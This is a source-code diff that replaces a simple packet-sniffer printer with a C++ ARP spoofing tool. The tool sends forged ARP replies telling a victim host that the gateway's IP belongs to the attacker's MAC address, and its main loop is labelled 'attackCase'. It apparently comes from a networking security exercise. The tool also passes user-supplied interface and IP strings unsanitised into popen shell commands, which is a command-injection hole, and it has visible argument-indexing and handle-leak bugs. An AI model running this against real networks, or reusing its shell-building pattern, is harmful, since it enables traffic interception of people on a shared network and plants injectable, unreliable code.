@@ -1,197 +1,171 @@
-#include <stdbool.h>
-#include <stdio.h>
+#include <cstdio>
+#include <pcap.h>
+
 #include <stdlib.h>
 #include <string.h>
-#include <pcap.h>
-#include "libnet.h"
+
+
+#include "ethhdr.h"
+#include "arphdr.h"
+
+#define MAX_STR_SIZE 2048
+
+#pragma pack(push, 1)
+struct EthArpPacket final {
+    EthHdr eth_;
+    ArpHdr arp_;
+};
+#pragma pack(pop)
 
 void usage() {
-    printf("syntax: pcap-test <interface>\n");
-    printf("sample: pcap-test wlan0\n");
+    printf("syntax: SendArp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+    printf("sample: SendArp eth0 192.168.0.2 192.168.0.3\n");
 }
 
-typedef struct {
-    char* dev_;
-} Param;
+char myMAC[MAX_STR_SIZE];
 
-Param param  = {
-    .dev_ = NULL
-};
-
-bool parse(Param* param, int argc, char* argv[]) {
-    if (argc != 2) {
-        usage();
-        return false;
-    }
-    param->dev_ = argv[1];
-    return true;
-}
-
-uint16_t printEther(const u_char* packet)
+void getMyAddr(char* dev)
 {
-    int i;
-    struct libnet_ethernet_hdr* eth = (struct libnet_ethernet_hdr*)packet;
-    printf("[Ethernet]\n");
-
-    printf("SRC MAC : ");
-    for(i=0;i<6; i++)
+    FILE *fp = NULL;
+    char command[MAX_STR_SIZE]="ifconfig \0";
+    strcat(command,dev);
+    if((fp=popen(command,"r"))==NULL)
     {
-        printf("%02x",eth->ether_shost[i]);
-        if(i!=5) printf(":");
-    }printf("\n");
-
-    printf("DST MAC : ");
-    for(i=0;i<6; i++)
-    {
-        printf("%02x",eth->ether_dhost[i]);
-        if(i!=5) printf(":");
-    }printf("\n");
-    return ntohs(eth->ether_type);
-}
-
-void PrintIPv4adr(uint32_t IPadr)
-{
-    int i;
-    uint8_t adr[4];
-    adr[3]=(IPadr>>24)&0xFF;
-    adr[2]=(IPadr>>16)&0xFF;
-    adr[1]=(IPadr>>8)&0xFF;
-    adr[0]=IPadr&0xFF;
-    for(i=0;i<4;i++)
-    {
-        printf("%d",adr[i]);
-        if(i!=3) printf(".");
-    }
-    printf("\n");
-}
-
-uint8_t printIPv4(const u_char* packet)
-{
-    struct libnet_ipv4_hdr* ip = (struct libnet_ipv4_hdr*)packet;
-    printf("[IPv4]\n");
-    printf("SRC IPv4 : ");
-    PrintIPv4adr(ip->ip_src.s_addr);
-    printf("DST IPv4 : ");
-    PrintIPv4adr(ip->ip_dst.s_addr);
-    return ip->ip_p;
-}
-
-
-void printTCP(const u_char* packet)
-{
-    struct libnet_tcp_hdr* tcp = (struct libnet_tcp_hdr*)packet;
-    printf("[TCP]\n");
-    printf("SRC PORT : %d\n",ntohs(tcp->th_sport));
-    printf("DST PORT : %d\n",ntohs(tcp->th_dport));
-}
-
-void printUDP(const u_char* packet)
-{
-    struct libnet_udp_hdr* udp = (struct libnet_udp_hdr*)packet;
-    printf("[UDP]\n");
-    printf("SRC PORT : %d\n",ntohs(udp->uh_sport));
-    printf("DST PORT : %d\n",ntohs(udp->uh_dport));
-}
-
-void printDATA(const u_char* packet)
-{
-    int i;
-    printf("[DATA]\n");
-    for(i=0;i<8;i++)
-        printf("%02x ",packet[i]);
-    printf("\n");
-}
-
-
-
-
-void packetAnalysis(const u_char* packet)
-{
-    uint16_t ipType = printEther(packet);
-    packet+=LIBNET_ETH_H; // stLIBNET_UDP_Hatic header size = 14bytes
-    uint8_t checkTCPUDP;
-
-    if(ipType==ETHERTYPE_IP) //ipv4
-    {
-       checkTCPUDP=printIPv4(packet);
-       packet+=LIBNET_IPV4_H; //static header size = 20bytes
-    }
-    else
-    {
-        printf("This packet cannot be analyzed.\n ");
+        fprintf(stderr,"Failed to open cmd");
         exit(1);
     }
 
-
-    if(checkTCPUDP==0x06)
+    char line[MAX_STR_SIZE]= "\0";
+    char* ptr;
+    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
     {
-        printTCP(packet);
-        packet+=LIBNET_TCP_H;
-    }
-    else if(checkTCPUDP==0x11)
-    {
-        printUDP(packet);
-        packet+=LIBNET_UDP_H;
-    }
-    else
-    {
-        printf("This packet cannot be analyzed.\n ");
-        exit(1);
-    }
-
-    if(packet==NULL)
-        printf("NO DATA");
-    else
-        printDATA(packet);
-}
-
-
-void packet_lookup()
-{
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
-
-    if (pcap == NULL)
-    {
-        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
-       exit(1);
-    }
-
-    while (true)
-    {
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-
-        int res = pcap_next_ex(pcap, &header, &packet);
-
-        if (res == 0) continue;
-
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        ptr=strtok(line," ");
+        if(!strcmp(ptr,"ether"))
         {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            ptr=strtok(NULL," ");
+            strcpy(myMAC,ptr);
+
             break;
         }
 
-        printf("===================\n");
+    }
+}
 
-        printf("%u bytes captured\n", header->caplen);
+const char* getMACAddr(char *IP)
+{
 
-        packetAnalysis(packet);
+    FILE *fp = NULL;
 
-        printf("===================\n\n");
+    int len = strlen(IP);
+    char* cmd = "ping -c 1 \0";
+
+    char command[MAX_STR_SIZE];
+
+    strcpy(command,cmd);
+    strcat(command,IP);
+
+    if((fp=popen(command,"r"))==NULL)
+    {
+        fprintf(stderr,"Failed to open cmd");
+        exit(1);
+    }
+
+    if((fp=popen("arp -an","r"))==NULL)
+    {
+        fprintf(stderr,"Failed to open cmd");
+        pclose(fp);
+        exit(1);
+    }
+
+    char line[MAX_STR_SIZE]= "\0";
+    char* ptr;
+
+    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
+    {
+
+        ptr = strtok(line," ");
+        ptr = strtok(NULL," ");
+
+        if(!strncmp((ptr+1),IP,len))
+        {
+
+            ptr = strtok(NULL," ");
+            ptr = strtok(NULL," ");
+
+            pclose(fp);
+
+            ptr[17]='\0';
+
+            printf("%s(%d)\n",ptr,strlen(ptr));
+            return ptr;
+         }
 
     }
 
-    pcap_close(pcap);
+    fprintf(stderr,"We couldn't find MAC!");
+    pclose(fp);
+    exit(1);
 
 }
 
-int main(int argc, char* argv[])
+void sendARP(char* dev, char* sender_IP, char* target_IP)
 {
 
-    if (!parse(&param, argc, argv))
-        return -1;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        exit(1);
+    }
 
-    packet_lookup();
+    EthArpPacket packet;
+    const char* sender_MAC = getMACAddr(sender_IP);
+
+    packet.eth_.dmac_ = Mac(sender_MAC);   // you
+    packet.eth_.smac_ = Mac(myMAC);   // me
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Reply);
+    printf("myMAC\n");
+    packet.arp_.smac_ = Mac(myMAC);   //me
+    packet.arp_.sip_ = htonl(Ip(target_IP)); //gate
+    printf("senderMAC\n");
+    packet.arp_.tmac_ = Mac(sender_MAC);   //you
+    packet.arp_.tip_ = htonl(Ip(sender_IP));        //you
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    pcap_close(handle);
+}
+
+int main(int argc, char* argv[]) {
+
+    int i;
+    int attackCase = 0;
+
+    if (argc < 4 || argc%2!=0)
+    {
+        usage();
+        return -1;
+    }
+
+    attackCase = (argc-2)/2;
+
+    getMyAddr(argv[1]);
+
+    for (i=0;i<attackCase;i++)
+    {
+        sendARP(argv[1],argv[2+i],argv[3+i]);
+    }
+
 
 }
+
